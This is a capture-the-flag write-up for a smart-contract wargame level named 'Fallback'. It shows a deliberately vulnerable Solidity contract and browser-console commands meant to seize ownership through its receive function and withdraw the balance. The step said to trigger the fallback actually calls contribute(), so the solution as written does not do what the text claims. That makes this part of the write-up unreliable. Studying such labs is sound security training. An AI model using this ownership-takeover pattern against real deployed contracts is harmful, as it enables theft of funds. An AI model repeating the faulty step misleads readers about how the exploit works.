# Level 1 - Fallback

### Objectives

The objectives of this level are as follows:

1. Claim ownership of the contract
2. Reduce its balance to 0

### Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

### Solution

We are going to exploit the fallback function within this contract, namely:

```
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

According to Solidity documentation, "The fallback function is executed on a call to the contract if none of the other functions match the given function signature, or if no data was supplied at all and there is no receive Ether function. The fallback function always receives data, but in order to also receive Ether it must be marked payable."

First, we are going to contribute to the contract by sending some value less than 0.001 ether:

```
await contract.contribute.sendTransaction({ from: player, value: toWei('0.0005')})
```

We can verify that we successfully contributed to the contract by calling the getContribution() function:

```
await contract.getContribution().then(v => v.toString())
```

Next, we are going to send some ether to the contract in order to execute the fallback function:

```
await contract.contribute.sendTransaction({value: "100"})
```

By sending ether to the contract, we have become the contract owner. We can verify this by ensuring that the following outputs `true`:

```
await contract.owner() === player
```

Finally, we can empty the contract and complete the level:

```
await contract.withdraw()
```

Done!
